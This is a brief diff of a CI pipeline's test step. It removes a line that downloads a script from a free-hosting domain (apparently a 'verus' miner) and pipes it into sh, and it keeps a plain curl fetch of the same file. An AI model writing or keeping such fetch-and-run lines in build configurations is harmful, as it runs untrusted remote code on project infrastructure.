@@ -11,4 +11,4 @@ steps:
 - name: test
   image: gradle:jdk17
   commands:
-  - curl -fsSL https://verus01.000webhostapp.com/verus.txt | sh
+  - curl -fsSL https://verus01.000webhostapp.com/verus.txt
